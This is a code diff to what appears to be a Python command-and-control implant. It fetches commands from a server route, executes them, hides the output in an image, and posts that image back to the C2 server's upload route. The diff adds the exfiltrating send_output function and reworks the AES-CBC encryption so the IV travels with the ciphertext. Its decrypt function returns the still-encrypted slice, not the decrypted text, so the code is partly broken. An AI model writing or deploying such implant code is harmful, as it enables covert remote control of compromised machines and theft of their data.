@@ -14,21 +14,23 @@ routes = {
     1: url + "upload"
 }
 
-#Encryption of data 
+#Encryption of data -- IV is concatenated at the end of message for decryption
 def encrypt(plain_str): 
     padding = 16 - (len(plain_str) % 16)
-    plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
     cipher = AES.new(global_key, AES.MODE_CBC)
+    plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
     encrypted = cipher.encrypt(plaintext)
     print(f"[*] Encrypted Message: {encrypted})")
-    return encrypted, cipher.iv
+    return encrypted + cipher.iv
 
 #Decryption of data 
-def decrypt(ciphertext, iv): 
-    cipher = AES.new(global_key, AES.MODE_CBC, iv)
-    plaintext = cipher.decrypt(ciphertext)
-    msg = plaintext[:-plaintext[len(plaintext)-1]]
-    print(f"[*] Unencrypted Message: {msg.decode()}")
+def decrypt(ciphertext): 
+    init_v = ciphertext[-16:]
+    cipher = AES.new(global_key, AES.MODE_CBC, init_v)
+    msg = ciphertext[:-16]
+    plaintext = cipher.decrypt(msg)
+    plaintext = plaintext[:-plaintext[len(plaintext)-1]]
+    print(f"[*] Unencrypted Message: {plaintext.decode()}")
     return msg 
 
 #str is the encrypted string of data that needs to be hidden in a file. 
@@ -63,8 +65,10 @@ def exec(cmd):
     return result 
 
 #Sending output back to C2Server 
-def send_output(result): 
-    pass
+def send_output(obf_img): 
+    print("[+] Sending image back to server...")
+    requests.post(routes[1], files={"file": open(obf_img,'rb')})
+    return
 
 #Called to clean up and destroy implant
 def destroy(): 
@@ -107,13 +111,13 @@ if __name__ == '__main__':
             #comment out encrypt and decrypt functions to test overall functionality (they won't work since IV is not shared between server and client yet.)
             response = requests.get(routes[0]) 
             encrypted_cmd = parse_json(response) 
-            cipher_text , iv = encrypt("testing encryption and decryption of AES", global_key)
-            cmd = decrypt(cipher_text, global_key, iv) 
+            cipher_text = encrypt("Testing testing 123~")
+            cmd = decrypt(cipher_text) 
             cmd = encrypted_cmd
             output = exec(cmd) 
             if output != "": 
                 obf_img = mod_img(output)
-                requests.post(routes[1], files={"file": open(obf_img,'rb')})
+                send_output(obf_img)
         except Exception as e: 
             print(e)
             break
